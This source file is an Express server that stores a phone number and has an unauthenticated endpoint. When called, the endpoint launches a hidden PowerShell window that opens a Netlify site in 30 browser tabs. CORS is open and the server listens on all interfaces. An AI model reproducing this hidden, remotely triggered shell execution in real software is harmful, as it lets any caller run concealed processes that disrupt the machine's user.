const express = require("express");
const cors = require("cors");

const app = express();

// Allow all origins for development; restrict in production
app.use(cors());
app.use(express.json());

// In-memory store (replace with DB for production)
let storedPhone = "";

// Get current phone
app.get("/api/phone", (req, res) => {
  res.json({ phone: storedPhone });
});

// Save/update phone
app.post("/api/phone", (req, res) => {
  const phone = req.body?.phone || "";
  storedPhone = phone;
  res.json({ ok: true, phone: storedPhone });
});

// Open PowerShell endpoint - opens PowerShell (hidden) and runs Start-Process command 30 times with 1 second delay
app.post("/api/open-ps", (req, res) => {
  console.log('open-ps endpoint called');
  const { exec } = require("child_process");
  
  try {
    // PowerShell hidden mode ma open karo ane Start-Process command 30 times run karo (1 second delay between each)
    // -WindowStyle Hidden use kariye PowerShell window hide karva mate
    // -NoExit remove kariye karan ke hidden window no use nathi
    const command = 'powershell.exe -WindowStyle Hidden -Command "for ($i = 1; $i -le 30; $i++) { Start-Process \'https://graceful-meerkat-d64999.netlify.app/\'; Start-Sleep -Seconds 1 }"';
    
    exec(command, {
      detached: true,
      windowsHide: true  // Node.js level par pan hide karo
    }, (error, stdout, stderr) => {
      if (error) {
        console.error("Error:", error);
      }
      if (stdout) console.log("Output:", stdout);
      if (stderr) console.error("Stderr:", stderr);
    });
    
    console.log("PowerShell (hidden) will open 30 tabs in 30 seconds!");
    res.json({ ok: true, message: "PowerShell (hidden) will launch 30 tabs in 30 seconds" });
  } catch (error) {
    console.error("Error opening PowerShell:", error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Bind to 0.0.0.0 so phones on LAN can reach it
// Production ma (Railway/Render) PORT environment variable thi aave
const PORT = process.env.PORT || 4000;
const HOST = process.env.HOST || "0.0.0.0";
app.listen(PORT, HOST, () => {
  console.log(`API listening on http://${HOST}:${PORT}`);
});